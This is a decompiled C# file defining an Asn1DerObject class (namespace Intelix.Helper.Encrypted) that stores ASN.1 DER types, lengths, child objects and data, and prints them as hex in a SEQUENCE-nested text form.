using System;
using System.Collections.Generic;
using System.Text;

namespace Intelix.Helper.Encrypted
{
	// Token: 0x0200006E RID: 110
	public class Asn1DerObject
	{
		// Token: 0x17000011 RID: 17
		// (get) Token: 0x060001A9 RID: 425 RVA: 0x0001513C File Offset: 0x0001333C
		// (set) Token: 0x060001AA RID: 426 RVA: 0x00015144 File Offset: 0x00013344
		public Asn1Der.Type Type { get; set; }

		// Token: 0x17000012 RID: 18
		// (get) Token: 0x060001AB RID: 427 RVA: 0x0001514D File Offset: 0x0001334D
		// (set) Token: 0x060001AC RID: 428 RVA: 0x00015155 File Offset: 0x00013355
		public int Lenght { get; set; }

		// Token: 0x17000013 RID: 19
		// (get) Token: 0x060001AD RID: 429 RVA: 0x0001515E File Offset: 0x0001335E
		public List<Asn1DerObject> Objects { get; }

		// Token: 0x17000014 RID: 20
		// (get) Token: 0x060001AE RID: 430 RVA: 0x00015166 File Offset: 0x00013366
		// (set) Token: 0x060001AF RID: 431 RVA: 0x0001516E File Offset: 0x0001336E
		public byte[] Data { get; set; }

		// Token: 0x060001B0 RID: 432 RVA: 0x00015177 File Offset: 0x00013377
		public Asn1DerObject()
		{
			this.Objects = new List<Asn1DerObject>();
		}

		// Token: 0x060001B1 RID: 433 RVA: 0x0001518C File Offset: 0x0001338C
		public override string ToString()
		{
			StringBuilder stringBuilder = new StringBuilder();
			StringBuilder stringBuilder2 = new StringBuilder();
			Asn1Der.Type type = this.Type;
			Asn1Der.Type type2 = type;
			switch (type2)
			{
			case Asn1Der.Type.Integer:
			{
				byte[] data = this.Data;
				foreach (byte b in data)
				{
					stringBuilder2.AppendFormat("{0:X2}", b);
				}
				StringBuilder stringBuilder3 = stringBuilder;
				string str = "\tINTEGER ";
				StringBuilder stringBuilder4 = stringBuilder2;
				stringBuilder3.AppendLine(str + ((stringBuilder4 != null) ? stringBuilder4.ToString() : null));
				break;
			}
			case (Asn1Der.Type)3:
			case (Asn1Der.Type)5:
				break;
			case Asn1Der.Type.OctetString:
			{
				byte[] data2 = this.Data;
				foreach (byte b2 in data2)
				{
					stringBuilder2.AppendFormat("{0:X2}", b2);
				}
				StringBuilder stringBuilder5 = stringBuilder;
				string str2 = "\tOCTETSTRING ";
				StringBuilder stringBuilder6 = stringBuilder2;
				stringBuilder5.AppendLine(str2 + ((stringBuilder6 != null) ? stringBuilder6.ToString() : null));
				break;
			}
			case Asn1Der.Type.ObjectIdentifier:
			{
				byte[] data3 = this.Data;
				foreach (byte b3 in data3)
				{
					stringBuilder2.AppendFormat("{0:X2}", b3);
				}
				StringBuilder stringBuilder7 = stringBuilder;
				string str3 = "\tOBJECTIDENTIFIER ";
				StringBuilder stringBuilder8 = stringBuilder2;
				stringBuilder7.AppendLine(str3 + ((stringBuilder8 != null) ? stringBuilder8.ToString() : null));
				break;
			}
			default:
				if (type2 == Asn1Der.Type.Sequence)
				{
					stringBuilder.AppendLine("SEQUENCE {");
				}
				break;
			}
			foreach (Asn1DerObject value in this.Objects)
			{
				stringBuilder.Append(value);
			}
			bool flag = this.Type.Equals(Asn1Der.Type.Sequence);
			if (flag)
			{
				stringBuilder.AppendLine("}");
			}
			return stringBuilder.ToString();
		}
	}
}
